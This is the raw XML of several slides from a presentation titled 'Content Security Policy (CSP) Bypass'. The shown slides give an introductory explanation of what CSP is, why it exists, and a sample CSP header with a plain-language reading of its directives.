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13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66906"/>
            <a:ext cx="14630400" cy="8229600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFCF5"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3859454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sv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7.pn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39.svg"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide28.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0.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35.sv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78237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Content Security Policy (CSP) Bypass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6280190" y="4540091"/>
            <a:ext cx="7556421" cy="907018"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3550"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CSP security mechanisms and common bypass techniques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981087" y="1088588"/>
            <a:ext cx="6022300" cy="392549"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2450" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="325F7B"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>1. What is Content Security Policy (CSP)?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2981087" y="1508879"/>
            <a:ext cx="2512457" cy="313968"/>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Definition</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2981087" y="1927146"/>
            <a:ext cx="8668226" cy="312182"/>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Content Security Policy (CSP) is a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="950" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>security standard</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> that helps prevent Cross-Site Scripting (XSS), clickjacking, and other code injection attacks by </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="950" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>controlling which resources</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> the browser is allowed to load for a given page.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2981087" y="2343626"/>
            <a:ext cx="2512457" cy="313968"/>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Why CSP Exists</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2981087" y="2761893"/>
            <a:ext cx="8668226" cy="156091"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Traditional XSS defenses (input validation, output encoding) are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="950" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>not enough</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>. CSP provides an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="950" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>additional layer of defense</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> by:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2981087" y="2996208"/>
            <a:ext cx="2114907" cy="997506"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1889"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3106698" y="3121819"/>
            <a:ext cx="1853208" cy="196215"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Restricting script sources</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3106698" y="3359706"/>
            <a:ext cx="1863685" cy="312182"/>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Only allow scripts from trusted domains</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5165527" y="2996208"/>
            <a:ext cx="2114907" cy="997506"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1889"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5291138" y="3121819"/>
            <a:ext cx="1863685" cy="392430"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Blocking inline JavaScript</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5291138" y="3555921"/>
            <a:ext cx="1863685" cy="312182"/>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Prevent &lt;script&gt; tags and event handlers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7349966" y="2996208"/>
            <a:ext cx="2114907" cy="997506"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1889"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7475577" y="3121819"/>
            <a:ext cx="1570315" cy="196215"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Preventing eval()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7475577" y="3359706"/>
            <a:ext cx="1863685" cy="312182"/>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Block dangerous JavaScript functions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9534406" y="2996208"/>
            <a:ext cx="2114907" cy="997506"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1889"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9660017" y="3121819"/>
            <a:ext cx="1863685" cy="392430"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Controlling resource loading</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9660017" y="3555921"/>
            <a:ext cx="1863685" cy="156091"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Restrict images, styles, fonts, etc.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2981087" y="4063246"/>
            <a:ext cx="8668226" cy="645200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2921"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3106698" y="4188857"/>
            <a:ext cx="1570315" cy="196215"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Enforcing HTTPS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3106698" y="4426744"/>
            <a:ext cx="8417004" cy="156091"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Upgrade insecure requests</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2981087" y="4812744"/>
            <a:ext cx="2521268" cy="313968"/>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CSP Header Example</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2981087" y="5231011"/>
            <a:ext cx="8668226" cy="500539"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3765"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2974896" y="5231011"/>
            <a:ext cx="8680609" cy="500539"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3765"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3100507" y="5325189"/>
            <a:ext cx="8429387" cy="312182"/>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Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com; style-src 'self' 'unsafe-inline'; img-src *; connect-src 'self'; font-src 'self' data:; object-src 'none'; media-src 'self'; frame-src 'none';</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2981087" y="5809774"/>
            <a:ext cx="8668226" cy="1331238"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1416"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C9DDE9"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="27" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3106698" y="5925622"/>
            <a:ext cx="196215" cy="156924"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3428524" y="5910620"/>
            <a:ext cx="1570315" cy="196215"/>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MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Translation:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3428524" y="6176367"/>
            <a:ext cx="8095178" cy="780825"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Load scripts only from same origin and https://trusted.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Allow inline styles (but not inline scripts)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Load images from anywhere</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>No plugins (Flash, Java)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>No iframes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402449" y="3118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25F7B"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2. How CSP Works</a:t>
            </a:r>
